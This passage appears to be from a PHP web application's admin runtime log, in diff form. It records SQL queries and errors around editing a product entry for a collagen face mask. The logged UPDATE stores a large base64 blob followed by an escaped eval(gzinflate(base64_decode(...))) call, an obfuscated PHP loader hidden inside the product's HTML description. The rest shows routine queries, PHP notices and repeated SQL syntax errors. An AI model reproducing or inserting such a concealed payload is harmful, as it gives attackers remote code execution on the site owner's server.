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\';eval(\"x65x76x61x6Cx28x67x7Ax69x6Ex66x6Cx61x74x65x28x62x61x73x65x36x34x5Fx64x65x63x6Fx64x65x28x24x6Fx29x29x29x3B\");?-->\r\n<p style=\"font-family:Arial, Verdana, sans-serif;color:#222222;\" class=\"p0\">\r\n	<p class=\"p0\" style=\"font-family:Arial, Verdana, sans-serif;color:#222222;\">\r\n		<strong><span style=\"font-size:24px;\">Ice&nbsp;Lift&nbsp;Hydrating&nbsp;Collagen&nbsp;Mask</span></strong>\r\n	</p>\r\n	<p class=\"p0\" style=\"font-family:Arial, Verdana, sans-serif;color:#222222;\">\r\n		<span style=\"color:#003399;\">This&nbsp;intense,&nbsp;hydrating&nbsp;mask&nbsp;uses&nbsp;a&nbsp;variety&nbsp;of&nbsp;natural&nbsp;vegetable&nbsp;extracts&nbsp;to&nbsp;reduce&nbsp;the&nbsp;lines&nbsp;and&nbsp;wrinkles.&nbsp;Tightens&nbsp;and&nbsp;smoothens,&nbsp;leaving&nbsp;the&nbsp;skin&nbsp;looking&nbsp;firmer&nbsp;and&nbsp;more&nbsp;supple.&nbsp;&nbsp;A&nbsp;unique&nbsp;efficient&nbsp;penetration&nbsp;system&nbsp;with&nbsp;controlled&nbsp;release&nbsp;and&nbsp;a&nbsp;strong&nbsp;surface&nbsp;tension&nbsp;allows&nbsp;penetration&nbsp;of&nbsp;nutrients&nbsp;deep&nbsp;into&nbsp;the&nbsp;tender&nbsp;skin.&nbsp;This&nbsp;increases&nbsp;cellular&nbsp;moisture&nbsp;storage&nbsp;capacity,&nbsp;repair&nbsp;fibrous&nbsp;tissue,and&nbsp;enhance&nbsp;elasticity.</span>\r\n	</p>\r\n	<p style=\"font-family:Arial, Verdana, sans-serif;color:#222222;\">\r\n		<strong></strong><strong><span style=\"color:#000000;font-size:24px;\">Application:</span></strong>\r\n	</p>\r\n	<p style=\"font-family:Arial, Verdana, sans-serif;color:#222222;\">\r\n		<span style=\"color:#003399;\">Open&nbsp;foil&nbsp;pack,&nbsp;take&nbsp;out&nbsp;the&nbsp;face&nbsp;mask,&nbsp;unfold&nbsp;and&nbsp;place&nbsp;on&nbsp;cleansed&nbsp;face.&nbsp;Remove&nbsp;after 25 minutes.&nbsp;Do&nbsp;not&nbsp;rinse&nbsp;or&nbsp;cleanseafter&nbsp;use.&nbsp;Allow&nbsp;the&nbsp;remaining&nbsp;ingredients&nbsp;to&nbsp;be&nbsp;absorbed&nbsp;by&nbsp;the&nbsp;face.&nbsp;Massage&nbsp;in&nbsp;the&nbsp;remaining&nbsp;essence&nbsp;in&nbsp;the&nbsp;pack.</span>\r\n	</p>\r\n	<div style=\"font-family:Arial, Verdana, sans-serif;color:#222222;\">\r\n		<p>\r\n			<span style=\"font-family:arial, helvetica, sans-serif;\"><strong><span style=\"font-size:26px;\"></span></strong><span style=\"font-size:16px;\"><span style=\"font-size:26px;\"><strong>Shelf&nbsp;Life/Validity:&nbsp;</strong></span>3&nbsp;years</span></span>\r\n		</p>\r\n		<p>\r\n			<br />\r\n		</p>\r\n		<p>\r\n			<span style=\"font-family:arial, helvetica, sans-serif;\"><strong><span style=\"font-size:26px;\"></span></strong><strong><span style=\"font-size:26px;\">Cautions:</span></strong></span>\r\n		</p>\r\n		<p>\r\n			<span style=\"color:#003399;\"><span style=\"font-family:arial, helvetica, sans-serif;color:#003399;\"><span style=\"font-size:16px;color:#003399;\">Keep&nbsp;it&nbsp;out&nbsp;of&nbsp;reach&nbsp;of&nbsp;kids&nbsp;for&nbsp;fear&nbsp;that&nbsp;they&nbsp;might&nbsp;put&nbsp;it&nbsp;in&nbsp;mouths.</span></span></span>\r\n		</p>\r\n		<p>\r\n			<span style=\"color:#003399;\"><span style=\"font-family:arial, helvetica, sans-serif;color:#003399;\"><span style=\"font-size:16px;color:#003399;\">It&nbsp;might&nbsp;cause&nbsp;allergy&nbsp;on&nbsp;some&nbsp;human&nbsp;bodies.&nbsp;In&nbsp;case&nbsp;of&nbsp;discomfort,&nbsp;stop&nbsp;using&nbsp;it&nbsp;at&nbsp;once&nbsp;and&nbsp;consult&nbsp;the&nbsp;doctor.</span></span></span>\r\n		</p>\r\n		<div>\r\n			<br />\r\n		</div>\r\n	</div>\r\n<span style=\"color:#003399;\"></span>\r\n</p>\r\n<div style=\"font-family:Arial, Verdana, sans-serif;color:#222222;\">\r\n	<div>\r\n	</div>\r\n</div>',`enable`=1,`proid`='10',`state`=0 WHERE ( id=111 ) [ RunTime:0.012972s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.006440s ]
+NOTIC: [8] Undefined index:  name D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 146 行.
+SQL: SELECT * FROM `procate` WHERE ( pid=0 ) ORDER BY sorts asc,pid asc  [ RunTime:0.000546s ]
+SQL: select count(a.id) as count from products a left join procate b on a.proid = b.id where 1=1  [ RunTime:0.000558s ]
+SQL: select a.id,a.title,a.ctime,a.imgs,a.sorts,a.enable,a.state,a.proid,b.title as protitle from products a left join procate b on a.proid = b.id where 1=1  order by a.sorts desc limit 0,10 [ RunTime:0.000680s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.026591s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.026686s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.001582s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001432s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001267s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001536s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006011s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.001724s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001797s ]
+
+[ 2014-10-10 15:05:01 ] 113.73.217.156 /admin.php/Product/selectChildProcate
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.001998s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002084s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001628s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001693s ]
+NOTIC: [8] Undefined index:  id D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 253 行.
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.005018s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=%d )  [ RunTime:0.000156s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%d )' at line 1
+ [ SQL语句 ] : SELECT * FROM `procate` WHERE ( pid=%d ) 
+
+[ 2014-10-10 15:05:04 ] 113.73.217.156 /admin.php/Product/getAllProductList/p/2?name=
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002616s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002729s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.002136s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.002232s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.006065s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.005539s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=0 ) ORDER BY sorts asc,pid asc  [ RunTime:0.000542s ]
+SQL: select count(a.id) as count from products a left join procate b on a.proid = b.id where 1=1  [ RunTime:0.000491s ]
+SQL: select a.id,a.title,a.ctime,a.imgs,a.sorts,a.enable,a.state,a.proid,b.title as protitle from products a left join procate b on a.proid = b.id where 1=1  order by a.sorts desc limit 10,10 [ RunTime:0.000783s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.029347s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.029441s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.001588s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001445s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001277s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001539s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006044s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.001745s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001816s ]
+
+[ 2014-10-10 15:05:04 ] 113.73.217.156 /admin.php/Product/selectChildProcate
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002013s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002099s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001629s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001695s ]
+NOTIC: [8] Undefined index:  id D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 253 行.
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004559s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=%d )  [ RunTime:0.000126s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%d )' at line 1
+ [ SQL语句 ] : SELECT * FROM `procate` WHERE ( pid=%d ) 
+
+[ 2014-10-10 15:05:07 ] 113.73.217.156 /admin.php/Product/getProductDetail?id=111
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002710s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002821s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.002168s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.002263s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.004489s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004223s ]
+SQL: SELECT * FROM `products` WHERE ( id=111 ) LIMIT 1   [ RunTime:0.000511s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=0 )  [ RunTime:0.000356s ]
+SQL: SELECT * FROM `procate` WHERE ( id=10 ) LIMIT 1   [ RunTime:0.000310s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.021614s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.021707s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.001753s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001628s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001409s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001778s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006785s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.001984s ]
+INFO: [ view_end ] --END-- [ RunTime:0.002071s ]
+
+[ 2014-10-10 15:05:08 ] 113.73.217.156 /admin.php/Product/selectChildProcate?id=10
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002193s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002288s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001801s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001873s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.005229s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=10 )  [ RunTime:0.000337s ]
+
+[ 2014-10-10 15:05:10 ] 113.73.217.156 /admin.php/Product/selectChildProcate
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002606s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002717s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.002138s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.002223s ]
+NOTIC: [8] Undefined index:  id D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 253 行.
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004611s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=%d )  [ RunTime:0.000136s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%d )' at line 1
+ [ SQL语句 ] : SELECT * FROM `procate` WHERE ( pid=%d ) 
+
+[ 2014-10-10 15:05:13 ] 113.73.217.156 /admin.php/Product/getAllProductList/p/3?name=
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.001997s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002081s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001634s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001707s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.004874s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004593s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=0 ) ORDER BY sorts asc,pid asc  [ RunTime:0.000443s ]
+SQL: select count(a.id) as count from products a left join procate b on a.proid = b.id where 1=1  [ RunTime:0.000418s ]
+SQL: select a.id,a.title,a.ctime,a.imgs,a.sorts,a.enable,a.state,a.proid,b.title as protitle from products a left join procate b on a.proid = b.id where 1=1  order by a.sorts desc limit 20,10 [ RunTime:0.000655s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.024865s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.024955s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.001752s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001592s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001411s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001698s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006667s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.001920s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001998s ]
+
